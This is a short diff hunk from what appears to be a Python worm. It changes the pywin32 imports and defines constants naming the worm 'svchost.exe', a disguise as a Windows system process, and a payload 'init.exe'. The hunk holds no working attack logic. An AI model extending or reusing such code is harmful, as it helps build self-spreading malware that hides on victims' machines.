@@ -6,11 +6,8 @@ import time
 import ctypes
 import requests
 import sys
-try:
-    from win32com.client import Dispatch
-    from win32com.shell import shell
-except ImportError:
-    pass  # pywin32 not installed, skip shortcut creation
+from win32com.client import Dispatch
+from win32com.shell import shell
 
 WORM_NAME = "svchost.exe"
 PAYLOAD_NAME = "init.exe"
